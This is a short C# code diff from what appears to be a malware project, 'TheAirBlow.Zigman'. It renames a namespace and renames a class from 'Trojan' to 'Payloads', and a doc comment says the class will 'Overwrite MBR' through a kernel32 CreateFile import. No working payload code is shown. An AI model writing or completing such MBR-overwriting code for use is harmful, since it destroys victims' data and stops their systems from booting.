@@ -5,12 +5,12 @@
 
 using System.Runtime.InteropServices;
 
-namespace TheAirBlow.Zigman.Legacy;
+namespace TheAirBlow.Zigman;
 
 /// <summary>
 /// Overwrite MBR
 /// </summary>
-public partial class Trojan
+public partial class Payloads
 {
     [DllImport("kernel32")]
     private static extern IntPtr CreateFile(
